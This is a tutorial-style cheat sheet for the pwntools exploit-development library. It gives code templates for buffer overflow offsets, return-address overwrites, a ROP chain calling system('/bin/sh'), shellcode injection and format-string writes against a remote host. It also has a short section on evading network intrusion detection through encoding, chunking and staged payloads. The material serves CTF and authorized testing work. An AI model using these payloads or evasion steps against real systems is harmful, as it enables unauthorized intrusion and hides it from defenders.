
# pwntools – Complete Pentester & Exploit Developer Guide

---

## 1. Overview

**Pwntools** is a Python library for CTFs, exploit development, and pentesting.  
It simplifies:
- Building custom exploits
- Sending/receiving data to sockets or processes
- Automating buffer overflows, ROP chains, format string exploits
- Interacting with binaries locally or remotely

---

## 2. Installation

```bash
pip install pwntools
```

---

## 3. Basic Workflow

```python
from pwn import *

# Connect to remote target
io = remote("10.10.14.23", 4444)

# Send payload
io.sendline(b"Hello Server")

# Receive data
response = io.recvline()
print(response)

# Close connection
io.close()
```

---

## 4. Common Pentest Use Cases

- **Buffer overflow automation** (finding offsets, crafting payloads)
- **ROP (Return Oriented Programming)** payload building
- **Shellcode injection** helpers
- **Brute-forcing input constraints**
- **Binary exploitation automation** (piping GDB, ELF analysis)

---

## 5. ELF & Process Interaction

```python
from pwn import *

elf = ELF("./vulnerable_binary")

# Get function address
print(hex(elf.symbols['main']))

# Spawn process
p = process("./vulnerable_binary")

# Send/Receive
p.sendline(b"A" * 100)
print(p.recvline())
```

---

## 6. Finding Buffer Overflow Offsets

```python
from pwn import *

# Generate cyclic pattern
pattern = cyclic(200)
print(pattern)

# Find offset
offset = cyclic_find(0x6161616c)  # Value from EIP/RIP crash
print(f"Offset: {offset}")
```

---

## 7. Crafting Payloads

```python
from pwn import *

padding = b"A" * 40
ret_addr = p64(0x40123a)

payload = padding + ret_addr
io = remote("10.10.14.23", 4444)
io.sendline(payload)
io.interactive()
```

---

## 8. ROP (Return Oriented Programming)

```python
from pwn import *

elf = ELF("./vuln")
rop = ROP(elf)

# Call system("/bin/sh")
rop.call(elf.symbols['system'], [next(elf.search(b"/bin/sh\x00"))])

print(rop.dump())
```

---

## 9. Shellcode Injection

```python
from pwn import *

context.arch = "amd64"
shellcode = asm(shellcraft.sh())

p = process("./vuln")
p.sendline(shellcode)
p.interactive()
```

---

## 10. Format String Exploits

```python
from pwn import *

payload = fmtstr_payload(6, {0x404020: 0xdeadbeef})
p = remote("10.10.14.23", 4444)
p.sendline(payload)
p.interactive()
```

---

## 11. Debugging with GDB

```python
from pwn import *

p = process("./vuln")
gdb.attach(p, gdbscript="""
break *main
continue
""")
```

---

## 12. Integration with Pentest Ops

- Automate exploitation of vulnerable binaries during engagements.
- Chain with **socket** or **requests** for initial foothold.
- Combine with **PyCryptodome** for encrypted shellcode delivery.

---

## 13. Detection Evasion Tips

- Encode shellcode (XOR, Base64) before sending.
- Split payload delivery into chunks to avoid triggering NIDS.
- Use staged payloads (small loader → full payload).

---

## 14. References

- Docs: https://docs.pwntools.com/
- CTF Wiki Pwntools: https://ctf-wiki.org/tools/pwntools/
- MITRE ATT&CK: Exploitation for Client Execution

---

